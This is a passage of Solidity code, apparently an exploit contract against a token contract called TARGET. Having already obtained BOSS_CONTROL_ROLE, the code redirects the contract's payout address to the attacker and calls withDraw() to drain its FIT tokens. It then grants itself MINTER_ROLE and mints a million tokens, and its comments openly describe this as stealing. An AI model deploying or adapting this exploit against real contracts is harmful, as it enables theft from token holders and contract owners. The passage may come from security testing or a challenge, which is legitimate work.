        // Verify we have BOSS_CONTROL_ROLE
        bool hasBossRole = ISecondToken(TARGET).hasRole(BOSS_CONTROL_ROLE, attacker);
        require(hasBossRole, "Failed to get BOSS_CONTROL_ROLE");

        // Step 3: Set addressForBosses to our address
        ISecondToken(TARGET).setAddressForBosses(attacker);

        // Step 4: Check if contract has FIT tokens to steal
        uint256 contractBalance = fitToken.balanceOf(TARGET);
        if (contractBalance > 0) {
            // Call withDraw() to steal all tokens
            ISecondToken(TARGET).withDraw();

            // Verify we received the tokens
            uint256 attackerBalance = fitToken.balanceOf(attacker);
            require(attackerBalance > 0, "No tokens received");
        }

        // Alternative: If no tokens in contract or we want more, mint new ones
        // Grant ourselves MINTER_ROLE
        bytes32 MINTER_ROLE = keccak256("MINTER_ROLE");
        ISecondToken(TARGET).grantRole(MINTER_ROLE, attacker);

        // Mint a large amount of tokens to ourselves
        uint256 mintAmount = 1_000_000 * 10**18;
        ISecondToken(TARGET).mint(attacker, mintAmount);

        // Verify minting worked
        uint256 finalBalance = fitToken.balanceOf(attacker);
        require(finalBalance >= mintAmount, "Minting failed");
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

